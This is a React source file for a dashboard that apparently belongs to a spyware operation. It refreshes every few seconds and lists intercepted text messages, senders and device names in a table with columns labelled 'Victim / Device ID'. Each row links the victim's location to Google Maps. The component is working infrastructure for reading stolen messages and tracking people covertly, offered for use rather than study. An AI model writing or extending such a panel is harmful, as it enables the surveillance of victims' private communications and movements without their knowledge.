import React, { useEffect, useState } from 'react'
import { fetchWithAuth } from '../services/auth'

export default function Dashboard(){
  const [logs, setLogs] = useState<any[]>([])
  const [query, setQuery] = useState('')

  useEffect(()=>{ fetchLogs(); const id = setInterval(fetchLogs, 3000); return ()=>clearInterval(id); }, [])

  async function fetchLogs(){
    try{ const res = await fetchWithAuth('/get-logs?limit=500'); const data = await res.json(); setLogs(data || []) }catch(e){ console.warn(e) }
  }

  const filtered = logs.filter(l => { if (!query) return true; const q = query.toLowerCase(); return [l.deviceId, l.device, l.sender, l.message, l.location].join(' ').toLowerCase().includes(q) })

  return (
    <div>
      <h2 className="text-xl text-primary font-bold mb-4">Dashboard</h2>
      <div className="bg-surface-dark border border-border-dark rounded-xl p-4 mb-4">
        <input value={query} onChange={e=>setQuery(e.target.value)} placeholder="Search by IP, Device, Sender, Message" className="w-full bg-background-dark border border-border-dark rounded-lg py-2 pl-3 pr-4 text-sm" />
      </div>

      <div className="bg-surface-dark rounded-xl border border-border-dark overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-left border-collapse min-w-[800px]">
            <thead>
              <tr className="bg-background-dark border-b border-border-dark">
                <th className="px-6 py-4 text-xs font-bold text-primary uppercase tracking-widest">Victim / Device ID</th>
                <th className="px-6 py-4 text-xs font-bold text-primary uppercase tracking-widest">Device Name</th>
                <th className="px-6 py-4 text-xs font-bold text-primary uppercase tracking-widest">From</th>
                <th className="px-6 py-4 text-xs font-bold text-primary uppercase tracking-widest">Message</th>
                <th className="px-6 py-4 text-xs font-bold text-primary uppercase tracking-widest">Time</th>
                <th className="px-6 py-4 text-xs font-bold text-primary uppercase tracking-widest text-right">Location</th>
              </tr>
            </thead>
            <tbody>
              {filtered.slice(0, 200).map(item => (
                <tr key={item._id} className="hover:bg-primary/5 transition-colors">
                  <td className="px-6 py-5 font-mono text-sm">{item.deviceId || '—'}</td>
                  <td className="px-6 py-5">{item.device || 'Unknown'}</td>
                  <td className="px-6 py-5">{item.sender || '—'}</td>
                  <td className="px-6 py-5">{String(item.message || '').slice(0,80)}</td>
                  <td className="px-6 py-5">{item.time ? new Date(item.time).toLocaleString() : ''}</td>
                  <td className="px-6 py-5 text-right">{item.location && item.location !== 'Disabled' ? <a className="text-primary hover:underline" target="_blank" href={`https://www.google.com/maps?q=${item.location}`}>Show on Map</a> : <span className="text-white/40">No Data</span>}</td>
                </tr>
              ))}
              {filtered.length === 0 && <tr><td colSpan={6} className="px-6 py-5 text-center text-white/40">No records</td></tr>}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  )
}
